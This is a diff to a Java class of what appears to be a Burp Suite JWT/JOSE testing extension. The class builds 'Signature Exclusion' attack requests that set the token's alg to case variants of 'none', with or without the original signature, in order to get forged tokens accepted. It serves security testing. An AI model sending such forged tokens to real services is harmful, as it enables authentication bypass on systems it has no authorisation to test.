@@ -38,7 +38,7 @@ import java.util.Map;
  * Signature Exclusion Attack Info
  * <p>
  * Class holding meta data for the Signature Exclusion attack and for preparing all necessary parameter for the actual attack.
- * 
+ *
  * @author Dennis Detering
  * @version 1.0
  */
@@ -55,7 +55,7 @@ public class SignatureExclusionInfo implements IAttackInfo {
 
     // Attack description
     private static final String description = "<html>The <em>Signature Exclusion</em> attack tries to get the token mistakenly verified "
-            + "by using the <em>None</em> algorithm and removing the signature.<br/>"
+            + "by using the <em>None</em> algorithm and (optionally) removing the signature.<br/>"
             + "In order to perform filter evasion, different capitalization is used as algorithm value.</html>";
 
     // Hashmap of "none" algorithm type variations
@@ -65,6 +65,11 @@ public class SignatureExclusionInfo implements IAttackInfo {
         noneAlgVariations.put(PayloadType.CAPITALIZED, "None");
         noneAlgVariations.put(PayloadType.UPPERCASE, "NONE");
         noneAlgVariations.put(PayloadType.MIXED, "nOnE");
+
+        noneAlgVariations.put(PayloadType.LOWERCASE_WITH_SIGNATURE, "none");
+        noneAlgVariations.put(PayloadType.CAPITALIZED_WITH_SIGNATURE, "None");
+        noneAlgVariations.put(PayloadType.UPPERCASE_WITH_SIGNATURE, "NONE");
+        noneAlgVariations.put(PayloadType.MIXED_WITH_SIGNATURE, "nOnE");
     }
 
     // Hashmap of available payloads with a verbose name (including the
@@ -72,7 +77,13 @@ public class SignatureExclusionInfo implements IAttackInfo {
     private static final HashMap<String, PayloadType> payloads = new HashMap<>();
     static {
         for (Map.Entry<PayloadType, String> noneAlgVariation : noneAlgVariations.entrySet()) {
-            payloads.put(String.format("Alg: %s (0x%02X)", noneAlgVariation.getValue(), noneAlgVariation.getKey().ordinal()), noneAlgVariation.getKey());
+
+            String payloadName = noneAlgVariation.getValue();
+            if (noneAlgVariation.getKey().toString().endsWith("_WITH_SIGNATURE")) {
+                payloadName = payloadName + " (with signature)";
+            }
+
+            payloads.put(String.format("Alg: %s (0x%02X)", payloadName, noneAlgVariation.getKey().ordinal()), noneAlgVariation.getKey());
         }
     }
 
@@ -84,7 +95,12 @@ public class SignatureExclusionInfo implements IAttackInfo {
         LOWERCASE,
         CAPITALIZED,
         UPPERCASE,
-        MIXED
+        MIXED,
+
+        LOWERCASE_WITH_SIGNATURE,
+        CAPITALIZED_WITH_SIGNATURE,
+        UPPERCASE_WITH_SIGNATURE,
+        MIXED_WITH_SIGNATURE
     }
 
     // List of SignatureExclusionsAttackRequest objects holding prepared attack
@@ -112,11 +128,20 @@ public class SignatureExclusionInfo implements IAttackInfo {
                 String tmpDecodedHeader = Decoder.getDecoded(tmpComponents[0]);
                 String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation.getValue() + "\"");
                 String tmpReplacedEncoded = Decoder.getEncoded(tmpReplaced);
-                String[] tmpNewComponents = { tmpReplacedEncoded, tmpComponents[1], "" };
+
+                String tmpSignature = "";
+                String payloadName = noneAlgVariation.getValue();
+                if (noneAlgVariation.getKey().toString().endsWith("_WITH_SIGNATURE")) {
+                    tmpSignature = tmpComponents[2];
+                    payloadName = payloadName + " (with signature)";
+                }
+
+                String[] tmpNewComponents = { tmpReplacedEncoded, tmpComponents[1], tmpSignature };
+
                 String tmpParameterValue = Decoder.concatComponents(tmpNewComponents);
 
                 byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, tmpParameterValue);
-                requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal(), noneAlgVariation.getValue()));
+                requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal(), payloadName));
 
             } catch (Exception e) {
                 throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
@@ -177,7 +202,12 @@ public class SignatureExclusionInfo implements IAttackInfo {
 
         result.put("header", header.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariations.get(payloadTypeId) + "\""));
         result.put("payload", payload);
-        result.put("signature", "");
+
+        if (payloadTypeId.toString().endsWith("_WITH_SIGNATURE")) {
+            result.put("signature", signature);
+        } else {
+            result.put("signature", "");
+        }
 
         return result;
     }
